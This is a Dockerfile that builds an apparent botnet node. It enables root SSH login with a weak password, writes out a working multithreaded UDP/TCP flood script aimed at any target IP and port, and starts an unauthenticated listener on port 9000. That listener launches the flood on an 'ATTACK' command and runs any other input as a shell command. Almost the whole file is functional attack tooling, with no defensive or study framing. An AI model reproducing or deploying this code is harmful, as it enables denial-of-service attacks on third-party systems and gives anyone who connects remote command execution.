FROM ubuntu:22.04

RUN apt update && apt install -y python3 openssh-server netcat-openbsd wget curl

RUN echo 'root:attack123' | chpasswd
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
RUN service ssh start

RUN mkdir /app
WORKDIR /app

# DDoS attack script pre-loaded
RUN echo 'import socket,threading,time,random,sys' > attack.py
RUN echo 'target_ip = sys.argv[1]' >> attack.py
RUN echo 'target_port = int(sys.argv[2])' >> attack.py
RUN echo 'THREADS = 500' >> attack.py
RUN echo 'DURATION = 300' >> attack.py
RUN echo 'stop_flag = False' >> attack.py
RUN echo 'pkt = [0]' >> attack.py
RUN echo 'payload = random._urandom(65507)' >> attack.py
RUN echo 'def udp():' >> attack.py
RUN echo '    while not stop_flag:' >> attack.py
RUN echo '        try:' >> attack.py
RUN echo '            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)' >> attack.py
RUN echo '            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)' >> attack.py
RUN echo '            for _ in range(100):' >> attack.py
RUN echo '                s.sendto(payload, (target_ip, target_port))' >> attack.py
RUN echo '                pkt[0] += 1' >> attack.py
RUN echo '            s.close()' >> attack.py
RUN echo '        except: pass' >> attack.py
RUN echo 'def tcp():' >> attack.py
RUN echo '    while not stop_flag:' >> attack.py
RUN echo '        try:' >> attack.py
RUN echo '            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> attack.py
RUN echo '            s.settimeout(0.01)' >> attack.py
RUN echo '            s.connect_ex((target_ip, target_port))' >> attack.py
RUN echo '            s.send(b"\x00"*65500)' >> attack.py
RUN echo '            pkt[0] += 1' >> attack.py
RUN echo '            s.close()' >> attack.py
RUN echo '        except: pass' >> attack.py
RUN echo 'for i in range(THREADS):' >> attack.py
RUN echo '    threading.Thread(target=udp if i%2==0 else tcp, daemon=True).start()' >> attack.py
RUN echo 'start = time.time()' >> attack.py
RUN echo 'while time.time() - start < DURATION:' >> attack.py
RUN echo '    time.sleep(1)' >> attack.py
RUN echo '    print(pkt[0])' >> attack.py
RUN echo 'stop_flag = True' >> attack.py

# Remote control endpoint
RUN echo 'import socket,subprocess' > listen.py
RUN echo 's=socket.socket()' >> listen.py
RUN echo 's.bind(("0.0.0.0", 9000))' >> listen.py
RUN echo 's.listen(1)' >> listen.py
RUN echo 'print("[READY] VPS listening on port 9000")' >> listen.py
RUN echo 'while True:' >> listen.py
RUN echo '    c,a=s.accept()' >> listen.py
RUN echo '    print(f"Connected: {a}")' >> listen.py
RUN echo '    data=c.recv(1024).decode().strip()' >> listen.py
RUN echo '    if data.startswith("ATTACK"):' >> listen.py
RUN echo '        _,ip,port=data.split()' >> listen.py
RUN echo '        subprocess.Popen(["python3","/app/attack.py",ip,port])' >> listen.py
RUN echo '        c.send(b"[+] ATTACK STARTED\n")' >> listen.py
RUN echo '    else:' >> listen.py
RUN echo '        out=subprocess.check_output(data,shell=True,stderr=subprocess.STDOUT)' >> listen.py
RUN echo '        c.send(out)' >> listen.py
RUN echo '    c.close()' >> listen.py

EXPOSE 9000
EXPOSE 22

CMD service ssh start && python3 /app/listen.py
